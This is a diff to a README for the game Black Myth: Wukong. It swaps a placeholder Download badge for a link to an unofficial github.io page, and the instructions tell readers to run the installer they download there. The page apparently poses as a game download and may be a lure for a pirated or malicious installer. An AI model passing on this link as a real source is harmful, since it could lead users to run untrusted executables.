@@ -8,7 +8,7 @@ Players take on the role of the **Destined One**, mastering the powers of Sun Wu
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-black?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-black?style=for-the-badge)](https://black-myth-wukong-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
